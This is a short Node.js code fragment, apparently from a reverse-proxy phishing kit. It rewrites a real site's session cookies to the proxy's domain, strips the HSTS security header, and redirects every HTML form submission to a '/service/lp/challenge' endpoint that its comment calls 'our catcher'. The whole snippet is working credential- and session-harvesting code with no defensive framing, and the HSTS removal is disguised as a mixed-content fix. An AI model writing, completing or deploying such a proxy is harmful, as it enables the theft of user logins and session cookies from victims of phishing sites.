proxy.on('proxyRes', (proxyRes, req, res) => {
  const hostHeader = req.headers['host'] || 'localhost';
  const yourDomain = hostHeader.split(':')[0];
  const setCookieHeaders = proxyRes.headers['set-cookie'];
  
  if (setCookieHeaders) {
    const rewrittenCookies = rewriteCookies(setCookieHeaders, yourDomain);
    proxyRes.headers['set-cookie'] = rewrittenCookies;
  }
  
  // Strip HSTS to avoid mixed content issues
  delete proxyRes.headers['strict-transport-security'];

  // IF THE RESPONSE IS HTML, REWRITE THE FORM ACTION
  const contentType = proxyRes.headers['content-type'] || '';
  if (contentType.includes('text/html')) {
    let body = '';
    proxyRes.on('data', (chunk) => {
      body += chunk.toString();
    });
    proxyRes.on('end', () => {
      // Find all form actions and replace them with /service/lp/challenge
      // This ensures the form always posts to our catcher
      body = body.replace(/action=["']([^"']*)["']/gi, 'action="/service/lp/challenge"');
      
      // Send the modified body
      res.setHeader('Content-Length', Buffer.byteLength(body));
      res.send(body);
    });
  } else {
    // If not HTML, pipe the response as usual
    proxyRes.pipe(res);
  }
});
